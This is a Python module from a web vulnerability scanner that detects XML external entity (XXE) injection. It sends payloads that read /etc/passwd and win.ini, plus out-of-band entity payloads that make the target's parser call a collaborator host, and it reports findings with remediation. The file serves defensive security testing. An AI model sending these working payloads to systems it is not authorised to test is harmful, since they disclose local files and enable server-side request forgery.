"""XML external entity (XXE) scanner (PRD §6.8 XXE).

In-band detection: posts an XML body declaring an external entity that reads a
local file, then matches the file's signature in the response. Blind/OOB
detection: declares an entity pointing at the OOB collaborator and confirms the
vuln when the XML parser calls back (works even when nothing is reflected).
Read-only; extracted content is not stored verbatim.
"""

from __future__ import annotations

import asyncio
from collections.abc import AsyncIterator

import httpx

from orthrus.core.context import ScanContext
from orthrus.core.schemas import Confidence, Evidence, Finding, HttpMethod, Severity
from orthrus.scanners.base_scanner import BaseScanner
from orthrus.scanners.lfi import detect_lfi
from orthrus.scanners.registry import register
from orthrus.utils.logger import get_logger
from orthrus.utils.scope import ScopeViolation

logger = get_logger("scanner.xxe")

SCANNER_NAME = "xxe"
MAX_TARGETS = 60
OOB_POLL_DELAY = 6.0  # seconds to wait for the parser's out-of-band callback


def xxe_payloads() -> list[str]:
    return [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<r>&xxe;</r>",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        "<r>&xxe;</r>",
    ]


def oob_xxe_payloads(callback: str) -> list[str]:
    """XML bodies whose entity resolution forces an out-of-band fetch.

    A hit on ``callback`` proves the parser resolves attacker-controlled
    external entities even when the response reflects nothing.
    """
    return [
        # General external entity referenced in the document body.
        f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{callback}">]><r>&xxe;</r>',
        # Parameter entity resolved during DTD processing (no body reference needed).
        f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "{callback}"> %ext;]><r>x</r>',
    ]


@register
class XxeScanner(BaseScanner):
    name = SCANNER_NAME
    vuln_type = "xxe"

    def _targets(self, ctx: ScanContext) -> list[str]:
        urls = [ctx.config.target]
        urls += [ep.url for ep in ctx.endpoints if ep.method == HttpMethod.POST]
        urls += [
            ep.url
            for ep in ctx.endpoints
            if any(k in ep.url.lower() for k in ("xml", "soap", "api", "upload", "import"))
        ]
        seen: set[str] = set()
        unique: list[str] = []
        for url in urls:
            if url not in seen:
                seen.add(url)
                unique.append(url)
        return unique[:MAX_TARGETS]

    async def scan(self, ctx: ScanContext) -> AsyncIterator[Finding]:
        targets = [url for url in self._targets(ctx) if ctx.scope.is_allowed(url)]
        headers = {"Content-Type": "application/xml"}
        for url in targets:
            for payload in xxe_payloads():
                try:
                    resp = await ctx.http.post(url, content=payload.encode(), headers=headers)
                except (ScopeViolation, httpx.HTTPError, httpx.InvalidURL) as exc:
                    logger.debug("xxe probe failed for %s: %s", url, exc)
                    continue
                matched = detect_lfi(resp.text)
                if matched:
                    yield Finding(
                        vuln_type="xxe",
                        title="XML external entity (XXE) injection",
                        severity=Severity.HIGH,
                        confidence=Confidence.FIRM,
                        url=url,
                        description=(
                            "The XML parser resolved an external entity and returned the contents "
                            f"of {matched}. XXE can lead to file disclosure, SSRF, and DoS."
                        ),
                        remediation=(
                            "Disable external entity and DTD processing in the XML parser "
                            "(e.g. defusedxml / FEATURE_SECURE_PROCESSING)."
                        ),
                        cwe="CWE-611",
                        scanner=SCANNER_NAME,
                        evidence=Evidence(
                            request_raw=payload,
                            matched_at=matched,
                            notes=f"{matched} contents returned via external entity",
                        ),
                    )
                    break

        async for finding in self._oob(ctx, targets):
            yield finding

    async def _oob(self, ctx: ScanContext, targets: list[str]) -> AsyncIterator[Finding]:
        """Blind/OOB XXE: confirm via a collaborator callback (no reflection needed)."""
        if ctx.callback is None:
            logger.debug("xxe: no callback server; OOB detection skipped")
            return
        headers = {"Content-Type": "application/xml"}
        jobs: list[tuple[str, str, str]] = []  # (url, token, callback_url)
        for url in targets:
            token, callback_url = ctx.callback.new_token()
            sent = False
            for payload in oob_xxe_payloads(callback_url):
                try:
                    await ctx.http.post(url, content=payload.encode(), headers=headers)
                    sent = True
                except (ScopeViolation, httpx.HTTPError, httpx.InvalidURL) as exc:
                    logger.debug("xxe oob probe failed for %s: %s", url, exc)
            if sent:
                jobs.append((url, token, callback_url))

        if not jobs:
            return
        await asyncio.sleep(OOB_POLL_DELAY)

        for url, token, callback_url in jobs:
            interactions = await ctx.callback.poll(token)
            if not interactions:
                continue
            hit = interactions[0]
            await ctx.store.add_callback(
                token, hit.protocol, hit.source_ip, {"path": hit.path, "method": hit.method}
            )
            yield Finding(
                vuln_type="xxe",
                title="Blind XML external entity (XXE) injection (out-of-band)",
                severity=Severity.HIGH,
                confidence=Confidence.FIRM,
                url=url,
                description=(
                    "The XML parser resolved an attacker-declared external entity and made an "
                    f"out-of-band {hit.protocol.upper()} request to the collaborator from "
                    f"{hit.source_ip or 'the target'}. Blind XXE enables file disclosure, SSRF "
                    "into internal services, and denial of service."
                ),
                remediation=(
                    "Disable external entity and DTD processing in the XML parser "
                    "(e.g. defusedxml / FEATURE_SECURE_PROCESSING)."
                ),
                cwe="CWE-611",
                scanner=SCANNER_NAME,
                evidence=Evidence(
                    request_raw=f"external entity -> {callback_url}",
                    matched_at=hit.source_ip,
                    notes=f"OOB callback from {hit.source_ip} (token {token})",
                ),
            )


__all__ = ["XxeScanner", "xxe_payloads"]
